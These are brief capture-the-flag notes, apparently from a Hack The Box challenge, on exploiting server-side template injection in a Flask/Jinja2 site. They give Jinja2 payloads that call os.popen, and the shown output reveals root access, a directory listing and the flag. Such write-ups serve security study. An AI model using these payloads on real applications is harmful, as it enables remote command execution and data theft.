@@ -1,0 +1,29 @@
+159.65.18.186:31677
+
+http://159.65.18.186:31677
+Site still under construction
+Proudly powered by Flask/Jinja2
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
+
+Jinja2 - Remote Code Execution
+Exploit the SSTI by calling os.popen().read()
+These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+
+Error 404
+The page 'uid=0(root) gid=0(root) groups=0(root) ' could not be found
+
+http://159.65.18.186:31677/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
+Error 404
+The page 'bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found
+
+
+http://159.65.18.186:31677/{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20flag.txt').read() }}
+Error 404
+The page 'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} ' could not be found
+
+P0WN3D
